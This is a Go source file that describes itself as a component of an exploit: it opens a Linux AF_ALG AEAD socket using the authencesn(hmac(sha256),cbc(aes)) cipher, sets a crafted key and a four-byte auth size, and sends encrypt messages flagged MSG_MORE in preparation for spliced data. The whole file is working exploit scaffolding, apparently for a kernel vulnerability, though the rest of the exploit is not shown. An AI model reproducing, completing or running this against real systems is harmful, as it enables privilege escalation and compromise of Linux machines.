//go:build linux

// Package alg provides an AF_ALG AEAD socket abstraction for the
// authencesn(hmac(sha256),cbc(aes)) cipher used by the exploit.
package alg

import (
	"encoding/hex"
	"fmt"
	"unsafe"

	"golang.org/x/sys/unix"
)

const cipherName = "authencesn(hmac(sha256),cbc(aes))"

// Conn wraps an AF_ALG AEAD socket pair (bind socket + accepted data socket).
type Conn struct {
	SocketFD   int
	AcceptedFD int
}

// Dial creates a new AF_ALG AEAD operation, returning the bound socket and
// the accepted data-plane file descriptor.
func Dial() (*Conn, error) {
	socketFD, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
	if err != nil {
		return nil, fmt.Errorf("create AF_ALG socket: %w", err)
	}

	if err := unix.Bind(socketFD, &unix.SockaddrALG{
		Type: "aead",
		Name: cipherName,
	}); err != nil {
		unix.Close(socketFD)
		return nil, fmt.Errorf("bind AF_ALG socket: %w", err)
	}

	key, err := hex.DecodeString(
		"0800010000000010" +
			"0000000000000000000000000000000000000000000000000000000000000000",
	)
	if err != nil {
		unix.Close(socketFD)
		return nil, fmt.Errorf("decode key: %w", err)
	}
	if err := unix.SetsockoptString(socketFD, unix.SOL_ALG, unix.ALG_SET_KEY, string(key)); err != nil {
		unix.Close(socketFD)
		return nil, fmt.Errorf("set key: %w", err)
	}
	if err := setNullSockopt(socketFD, unix.SOL_ALG, unix.ALG_SET_AEAD_AUTHSIZE, 4); err != nil {
		unix.Close(socketFD)
		return nil, fmt.Errorf("set auth size: %w", err)
	}

	acceptedFD, err := acceptRaw(socketFD)
	if err != nil {
		unix.Close(socketFD)
		return nil, fmt.Errorf("accept AF_ALG socket: %w", err)
	}

	return &Conn{SocketFD: socketFD, AcceptedFD: acceptedFD}, nil
}

// Close releases both file descriptors.
func (c *Conn) Close() {
	unix.Close(c.AcceptedFD)
	unix.Close(c.SocketFD)
}

// SendEncrypt sends a message with AEAD encrypt control headers through the
// accepted socket, using MSG_MORE to signal additional spliced data follows.
func (c *Conn) SendEncrypt(chunk []byte) error {
	message := append([]byte("AAAA"), chunk...)
	oob := buildCmsg(
		cmsg{typ: unix.ALG_SET_OP, data: []byte{0, 0, 0, 0}},
		cmsg{typ: unix.ALG_SET_IV, data: append([]byte{0x10}, make([]byte, 19)...)},
		cmsg{typ: unix.ALG_SET_AEAD_ASSOCLEN, data: []byte{0x08, 0, 0, 0}},
	)
	if err := unix.Sendmsg(c.AcceptedFD, message, oob, nil, unix.MSG_MORE); err != nil {
		return fmt.Errorf("sendmsg: %w", err)
	}
	return nil
}

// Drain reads and discards the AEAD output to complete the kernel operation.
func (c *Conn) Drain(n int) {
	buf := make([]byte, n)
	_, _ = unix.Read(c.AcceptedFD, buf)
}

// ---- helpers ----

func acceptRaw(fd int) (int, error) {
	accepted, _, errno := unix.Syscall6(unix.SYS_ACCEPT4, uintptr(fd), 0, 0, 0, 0, 0)
	if errno != 0 {
		return -1, errno
	}
	return int(accepted), nil
}

func setNullSockopt(fd, level, option int, length uintptr) error {
	_, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(fd), uintptr(level), uintptr(option),
		0, length, 0,
	)
	if errno != 0 {
		return errno
	}
	return nil
}

// ---- control-message construction ----

type cmsg struct {
	typ  int
	data []byte
}

func buildCmsg(msgs ...cmsg) []byte {
	total := 0
	for _, m := range msgs {
		total += unix.CmsgSpace(len(m.data))
	}

	oob := make([]byte, total)
	offset := 0
	for _, m := range msgs {
		hdr := (*unix.Cmsghdr)(unsafe.Pointer(&oob[offset]))
		hdr.Level = unix.SOL_ALG
		hdr.Type = int32(m.typ)
		hdr.SetLen(unix.CmsgLen(len(m.data)))

		dataStart := offset + unix.CmsgLen(0)
		copy(oob[dataStart:dataStart+len(m.data)], m.data)
		offset += unix.CmsgSpace(len(m.data))
	}
	return oob
}
